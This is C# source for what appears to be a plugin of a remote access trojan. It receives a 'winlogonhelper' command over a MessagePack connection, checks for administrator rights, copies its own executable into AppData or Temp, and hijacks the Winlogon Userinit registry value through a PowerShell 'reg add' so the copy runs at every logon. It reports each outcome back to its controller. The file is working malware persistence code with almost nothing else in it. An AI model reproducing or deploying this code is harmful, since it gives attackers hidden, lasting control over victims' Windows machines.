using MessagePackLib.MessagePack;
using System;
using System.Text;
using System.Threading;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Diagnostics;
using System.IO;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "winlogonhelper":
                        {
                            WinlogonHelper();
                            Connection.Disconnected();
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void PSLoader(string cmd)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            Pipeline pipeline = rs.CreatePipeline();
            pipeline.Commands.AddScript(cmd);
            pipeline.Invoke();
            rs.Close();
        }

        public static void WinlogonHelper()
        {
            if (!IsHighIntegrity())
            {
                Log(Connection.Hwid + ":[-] Not in high integrity!");
                return;
            }
            string name = Process.GetCurrentProcess().ProcessName + ".exe";

            string filepath;
            try
            {
                filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
            }
            catch
            {
                filepath = Path.Combine(Path.GetTempPath(), name);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
            }

            string cmd = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v userinit /d C:\\Windows\\system32\\userinit.exe," + filepath + " /t reg_sz /f";
            try
            {
                PSLoader(cmd);
                Log(Connection.Hwid + ":[+] WinLogonHelper Success!");
            }
            catch(Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}